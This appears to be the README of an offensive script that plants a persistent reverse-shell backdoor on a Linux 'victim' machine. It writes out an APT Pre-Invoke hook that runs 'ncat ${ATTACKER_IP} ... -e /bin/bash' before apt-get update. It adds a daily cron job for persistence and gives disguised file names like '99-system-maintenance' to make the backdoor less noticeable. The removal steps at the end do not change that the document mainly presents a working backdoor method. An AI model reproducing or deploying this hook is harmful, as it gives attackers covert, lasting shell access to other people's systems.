# Overview
This script creates a persistent reverse shell backdoor on a victim's Linux machine using the apt-get system and cron. It takes advantage of routine system commands to ensure that the backdoor remains active and accessible.

## How It Works
1. APT Hook:
The script sets up a configuration file for the Advanced Packaging Tool (APT) system, specifically for apt-get update.
It uses the APT::Update::Pre-Invoke directive to run a reverse shell command before apt-get update executes. This command connects back to the attacker's machine, allowing remote access to the victim's shell.
The command is:
```APT::Update::Pre-Invoke {"nohup ncat \${ATTACKER_IP} \${ATTACKER_PORT} -e /bin/bash 2> /dev/null &"};```
The nohup command ensures that the reverse shell remains open even if the terminal session is closed.

2. Daily Cron Job:
A secondary script is created and made executable. This script is scheduled to run daily via a cron job.
The cron job ensures that the reverse shell remains active by regularly running the script, even if the APT hook is not triggered or is removed.

## Components
APT Hook Configuration:
Located in /etc/apt/apt.conf.d/99-system-maintenance
Executes the reverse shell command before apt-get update.

Persistent Script:
Located at /usr/local/bin/daily_update.sh
Runs the reverse shell command and is executed daily by the cron job.

Cron Job:
Configured to run the script daily at midnight.
Located in /etc/cron.d/daily_update

## Summary
Reverse Shell via APT Hook: This method leverages the frequent use of apt-get update to execute a reverse shell command, making it less noticeable.
Persistence with Cron: The cron job ensures the reverse shell remains active by running the script daily, even if the APT hook is disrupted.

## Note
Root Privileges Required: This script must be run as root to ensure it can create the necessary files and set up the cron job properly.

## Removal Instructions
To remove the APT hook:
``rm -f /etc/apt/apt.conf.d/99-system-maintenance``

To remove the cron job:
``rm -f /etc/cron.d/daily_update``
